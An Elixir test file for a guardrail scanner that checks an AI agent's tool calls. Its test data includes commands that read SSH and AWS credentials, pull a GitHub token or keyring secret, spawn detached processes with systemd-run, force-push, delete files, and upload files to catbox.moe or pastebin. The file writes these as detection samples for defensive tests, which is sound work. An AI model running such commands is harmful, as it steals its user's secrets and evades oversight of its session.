defmodule Arbiter.Guardrails.ScanTest do
  use ExUnit.Case, async: true

  alias Arbiter.Guardrails.Scan

  describe "tool_input/2: hidden channels (critical)" do
    test "flags an executed systemd-run, busctl or secret-tool" do
      for cmd <- ["systemd-run --user /bin/sh", "busctl --user list", "secret-tool lookup a b"] do
        assert [%{kind: :hidden_channel_attempt, severity: :critical}] =
                 Scan.tool_input("Bash", %{"command" => cmd})
      end
    end

    test "flags gh auth token, and sees through wrappers and pipelines" do
      assert [%{kind: :hidden_channel_attempt, match: "gh auth token"}] =
               Scan.tool_input("Bash", %{"command" => "cd x && FOO=1 sudo gh auth token | cat"})

      assert [%{match: "systemd-run"}] =
               Scan.tool_input("run_command", %{"command" => "env A=b /usr/bin/systemd-run x"})
    end

    test "does not flag prose or an argument that merely mentions the name" do
      assert [] = Scan.tool_input("Bash", %{"command" => "git commit -m 'block systemd-run'"})
      assert [] = Scan.tool_input("Bash", %{"command" => "grep -rn busctl lib"})
      assert [] = Scan.tool_input("Bash", %{"command" => "gh auth status"})
      assert [] = Scan.tool_input("Write", %{"content" => "systemd-run", "file_path" => "a.md"})
    end

    test "reads the command of a codex shell item the same way" do
      assert [%{kind: :hidden_channel_attempt}] =
               Scan.tool_input("shell", %{"command" => "busctl --user"})
    end
  end

  describe "tool_input/2: credential reads (major)" do
    test "flags a reader command on a credential dir or the install DB" do
      for cmd <- [
            "cat ~/.ssh/id_ed25519",
            "tar czf x.tgz $HOME/.aws",
            "sqlite3 /srv/arbiter/arbiter.sqlite3 .dump",
            "ls /home/ryan/.config/gh"
          ] do
        assert [%{kind: :credential_read, severity: :major}] =
                 Scan.tool_input("Bash", %{"command" => cmd})
      end
    end

    test "flags a file tool pointed at a credential path" do
      assert [%{kind: :credential_read}] =
               Scan.tool_input("Read", %{"file_path" => "/home/ryan/.ssh/config"})

      assert [] = Scan.tool_input("Read", %{"file_path" => "/work/lib/a.ex"})
    end

    test "does not flag ssh/git using the key, or a commit message" do
      assert [] = Scan.tool_input("Bash", %{"command" => "ssh -i ~/.ssh/id host true"})
      assert [] = Scan.tool_input("Bash", %{"command" => "git commit -m 'read ~/.ssh docs'"})
    end
  end

  test "tool_input/2 is empty for junk input" do
    assert [] = Scan.tool_input("Bash", nil)
    assert [] = Scan.tool_input(nil, %{})
    assert [] = Scan.tool_input("Bash", %{"command" => 12})
  end

  describe "denial/2" do
    test "a safe-default category is major" do
      for cmd <- ["git push --force origin x", "git push -f", "rm -rf /tmp/x", "gh gist create a"] do
        assert %{kind: :permission_denial, severity: :major, category: cat} =
                 Scan.denial("Bash", %{"command" => cmd})

        assert is_binary(cat)
      end
    end

    test "a public upload host is critical" do
      assert %{kind: :public_upload_attempt, severity: :critical, category: "catbox.moe"} =
               Scan.denial("Bash", %{"command" => "curl -F f=@a https://files.catbox.moe/up"})

      assert %{kind: :public_upload_attempt} =
               Scan.denial("WebFetch", %{"url" => "https://pastebin.com/x"})
    end

    test "anything else is a minor permission denial" do
      assert %{kind: :permission_denial, severity: :minor, category: nil} =
               Scan.denial("Bash", %{"command" => "make deploy"})
    end
  end
end
